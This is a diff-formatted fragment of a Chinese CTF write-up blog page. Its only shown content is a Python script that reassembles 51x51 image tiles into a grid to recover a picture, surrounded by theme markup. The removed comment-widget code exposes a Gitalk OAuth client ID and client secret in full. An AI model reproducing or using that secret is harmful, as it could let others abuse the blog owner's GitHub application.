 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h1 id="ewum"><a href="#ewum" class="headerlink" title="ewum"></a>ewum</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">"/home/osword/Downloads/big/"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_list</span><span class="params">(file_path)</span>:</span></span><br><span class="line">    dir_list = os.listdir(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> dir_list:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dir_list = sorted(dir_list, key=<span class="keyword">lambda</span> x: os.path.getmtime(os.path.join(file_path, x)))</span><br><span class="line">        <span class="comment"># print(dir_list)</span></span><br><span class="line">        <span class="keyword">return</span> dir_list</span><br><span class="line">list_im = get_file_list(path)</span><br><span class="line">column = <span class="number">16</span></span><br><span class="line">row_num = <span class="number">6</span></span><br><span class="line">width = <span class="number">51</span></span><br><span class="line">height = <span class="number">51</span></span><br><span class="line">imgs = [Image.open(path+i) <span class="keyword">for</span> i <span class="keyword">in</span> list_im]</span><br><span class="line">target = Image.new(<span class="string">'RGB'</span>, (width*column, height*row_num))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list_im)):</span><br><span class="line">    <span class="keyword">if</span> i % column == <span class="number">0</span>:</span><br><span class="line">        end = len(list_im) <span class="keyword">if</span> i + column &gt; len(list_im) <span class="keyword">else</span> i + column</span><br><span class="line">        <span class="keyword">for</span> col, image <span class="keyword">in</span> enumerate(imgs[i:i+column]):</span><br><span class="line">            target.paste(image, (width*col, height*(i//column),width*(col + <span class="number">1</span>), height*(i//column + <span class="number">1</span>)))</span><br><span class="line">target.show()</span><br></pre></td></tr></table></figure>
 
 
 
 
-        </div>
-
-        <blockquote class="post-copyright">
-    
-    <div class="content">
-        
-<span class="post-time">
-    最后更新时间：<time datetime="2020-05-15T08:27:22.000Z" itemprop="dateUpdated">2020-05-15 16:27:22</time>
-</span><br>
-
-
-        
-        玩的开心
-        
-    </div>
-    
-    <footer>
-        <a href="http://zhzhdoai.github.io">
-            <img src="/img/avatar.jpg" alt="osword">
-            osword
-        </a>
-    </footer>
-</blockquote>
-
-        
-
-
-        <div class="post-footer">
-            
-	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
-
-
-            
-<div class="page-share-wrap">
-    
-
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=《数字经济云安全公测大赛Inject4fun题解 》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=《数字经济云安全公测大赛Inject4fun题解 》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《数字经济云安全公测大赛Inject4fun题解 》 — osword's blog&url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-
-
-        </div>
-    </div>
-
-    
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2019/09/22/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-fafuscan/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">课程设计 | fafuscan</h4>
-      </a>
-    </div>
-  
-
-  
-    <div class="waves-block waves-effect next">
-      <a href="/2019/09/17/Cmsms-2-2-9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-%E5%A4%8D%E7%8E%B0/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">Cmsms_2.2.9前台sql注入(复现)</h4>
-      </a>
-    </div>
-  
-</nav>
-
-
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<section class="comments" id="comments">
-    <div id="gitalk-container"></div>
-    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-    <script src="/js/md5.min.js"></script>
-    <script>
-        var gitalk = new Gitalk({
-            clientID: '7d7576c71632f14d639a',
-            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
-            repo: 'zhzhdoai.github.io',
-            owner: 'zhzhdoai',
-            admin: 'zhzhdoai',
-            id: md5(location.pathname),
-            perPage: 50,
-            distractionFreeMode: 'false'
-        })
-
-        gitalk.render('gitalk-container')
-    </script>
-</section>
-
-
-
+  </div>
 </article>
 
 
 
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Inject4Fun"><span class="toc-number">1.</span> <span class="toc-text">Inject4Fun</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">1.1.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解法二-wp"><span class="toc-number">1.2.</span> <span class="toc-text">解法二(wp)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ewum"><span class="toc-number">3.</span> <span class="toc-text">ewum</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&text=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&is_video=false&description=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=数字经济云安全公测大赛Inject4fun题解 &body=Check out this article: http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&name=数字经济云安全公测大赛Inject4fun题解 &description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&t=数字经济云安全公测大赛Inject4fun题解 " target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
 </div>
 
-        <footer class="footer">
-    <div class="top">
         
-<p>
-    <span id="busuanzi_container_site_uv" style='display:none'>
-        站点总访客数：<span id="busuanzi_value_site_uv"></span>
-    </span>
-    <span id="busuanzi_container_site_pv" style='display:none'>
-        站点总访问量：<span id="busuanzi_value_site_pv"></span>
-    </span>
-</p>
-
-
-        <p>
-            
-                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
-            
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
-        </p>
-    </div>
-    <div class="bottom">
-        <p><span>osword &copy; 2015 - 2020</span>
-            <span>
-                
-                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
-            </span>
-        </p>
-    </div>
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    osword
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
 </footer>
 
-    </main>
-    <div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=《数字经济云安全公测大赛Inject4fun题解 》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&title=《数字经济云安全公测大赛Inject4fun题解 》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《数字经济云安全公测大赛Inject4fun题解 》 — osword's blog&url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
 
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/" alt="微信分享二维码">
-</div>
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
 
 
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
 
+<!-- clipboard -->
 
-    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-<script>
-var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
 
-
-</script>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
-
-
-<div class="search-panel" id="search-panel">
-    <ul class="search-result" id="search-result"></ul>
-</div>
-<template id="search-tpl">
-<li class="item">
-    <a href="{path}" class="waves-block waves-effect">
-        <div class="title ellipsis" title="{title}">{title}</div>
-        <div class="flex-row flex-middle">
-            <div class="tags ellipsis">
-                {tags}
-            </div>
-            <time class="flex-col time">{date}</time>
-        </div>
-    </a>
-</li>
-</template>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
-
-
-
-
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-<script>
-(function() {
-    var OriginTitile = document.title, titleTime;
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-            document.title = '死鬼去哪里了！';
-            clearTimeout(titleTime);
-        } else {
-            document.title = '(つェ⊂)咦!又好了!';
-            titleTime = setTimeout(function() {
-                document.title = OriginTitile;
-            },2000);
-        }
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
     });
-})();
-</script>
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
 
 
 </body>
